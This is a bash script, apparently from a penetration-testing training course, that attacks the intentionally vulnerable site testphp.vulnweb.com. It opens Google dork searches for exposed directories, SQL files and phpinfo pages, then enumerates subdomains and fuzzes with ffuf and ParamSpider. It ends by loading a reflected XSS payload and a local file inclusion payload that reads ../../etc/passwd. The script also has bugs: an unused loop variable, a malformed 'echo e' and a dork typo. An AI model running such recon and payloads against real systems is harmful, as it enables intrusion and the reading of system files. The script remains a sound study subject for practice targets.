#!/bin/bash
url=http://testphp.vulnweb.com
echo "Google dork on $url"
firefox https://www.google.com/search?q=inrurl%3Atestphp.vulnweb.com+filetype%3Atxt&client=firefox-b-e&ei=zKkEY9ujKNSPseMP5-yA-AY&ved=0ahUKEwjbuby_3tz5AhXUR2wGHWc2AG8Q4dUDCA4&uact=5&oq=inrurl%3Atestphp.vulnweb.com+filetype%3Atxt&gs_lcp=Cgdnd3Mtd2l6EANKBAhBGAFKBAhGGABQ-wlY6T5gskNoAXAAeACAAdoBiAGQDpIBBjEuMTMuMZgBAKABAcABAQ&sclient=gws-wiz
firefox --new-tab https://www.google.com/search?q=inurl%3Atestphp.vulnweb.com+intitle%3A%22index+of%22&source=hp&ei=pKsEY9SEGeS94-EPgJedwAE&iflsig=AJiK0e8AAAAAYwS5tLUwe2q02_3xNN8qWWNR7MQM5Mhi&ved=0ahUKEwjU5rWg4Nz5AhXk3jgGHYBLBxgQ4dUDCAc&uact=5&oq=inurl%3Atestphp.vulnweb.com+intitle%3A%22index+of%22&gs_lcp=Cgdnd3Mtd2l6EAM6DggAEI8BEOoCEIwDEOUCOg4ILhCPARDqAhCMAxDlAjoLCAAQgAQQsQMQgwE6CAgAELEDEIMBOhEILhCABBCxAxCDARDHARDRAzoFCC4QgAQ6BQgAEIAEOg4ILhCABBCxAxCDARDUAjoICC4QgAQQsQM6CAgAEIAEELEDOhEILhCABBCxAxCDARDHARCvAToHCAAQgAQQClCDCFjJmQFgxZ8BaAdwAHgAgAHcAYgBhimSAQcyMi4yNy4xmAEAoAEBsAEK&sclient=gws-wiz
firefox --new-tab https://www.google.com/search?q=inurl%3Atestphp.vulnweb.com+intitle%3A%22index+of%22+%22sql%22&ei=MawEY5jICJWVseMPr5ykwAo&ved=0ahUKEwjYpMPj4Nz5AhWVSmwGHS8OCagQ4dUDCA4&uact=5&oq=inurl%3Atestphp.vulnweb.com+intitle%3A%22index+of%22+%22sql%22&gs_lcp=Cgdnd3Mtd2l6EANKBAhBGAFKBAhGGABQ5glYjQxg7xBoAXAAeACAAbcBiAHfA5IBAzAuM5gBAKABAcABAQ&sclient=gws-wiz
firefox --new-tab https://www.google.com/search?q=inurl%3Atestphp.vulnweb.com+intext%3A%22phpinfo.php%22&ei=F60EY8bwCITRseMP1s-32Ag&ved=0ahUKEwiG2JnR4dz5AhWEaGwGHdbnDYsQ4dUDCA4&uact=5&oq=inurl%3Atestphp.vulnweb.com+intext%3A%22phpinfo.php%22&gs_lcp=Cgxnd3Mtd2l6LXNlcnAQAzoHCAAQRxCwA0oECEEYAEoECEYYAFDZCFiKLWCUQ2gDcAF4AIABhgGIAYsLkgEEMS4xMpgBAKABAcgBCLgBAsABAQ&sclient=gws-wiz-serp
firefox --new-tab https://www.google.com/search?q=inurl%3Atestphp.vulnweb.com+intitle%3A%22index+of%22+%22*.php%22&ei=fK8EY6uaC6-NseMP7_m5wAo&ved=0ahUKEwiryML149z5AhWvRmwGHe98DqgQ4dUDCA4&uact=5&oq=inurl%3Atestphp.vulnweb.com+intitle%3A%22index+of%22+%22*.php%22&gs_lcp=Cgxnd3Mtd2l6LXNlcnAQA0oECEEYAUoECEYYAFCXD1iLFmDpGGgBcAB4AIABhQGIAfEBkgEDMC4ymAEAoAEBwAEB&sclient=gws-wiz-serp
url2=vulnweb.com
mkdir -p $url2/recon
echo
echo

findomain -t $url2 -q  >>$url2/recon/subs.txt
echo "Fuzzing on target vulnweb.com"
echo
for i in $(cat $url2/recon/subs.txt);do ffuf -u $url2/true  -w /usr/share/wordlists/rockyou.txt -mc 200;done | tee $url2/fuzz.txt
echo
echo "Fuzzing hidden params"
for b in $(cat $url2/recon/subs.txt);do echo e "-----------------URL:$b-----------------"; python3 /home/cdac/Training/Day5/ParamSpider/paramspider.py --domain $b;done | tee params-vulnweb.txt

echo "Exploiting target testphp.vulnweb.com"
echo "XSS on $url"
firefox --new-tab http://testphp.vulnweb.com/listproducts.php?cat=%3Cscript%3Ealert(%27XPOSED%27)%3C/script%3E
echo "lfi on $url"
firefox --new-tab http://testphp.vulnweb.com/showimage.php?file=../../etc/passwd

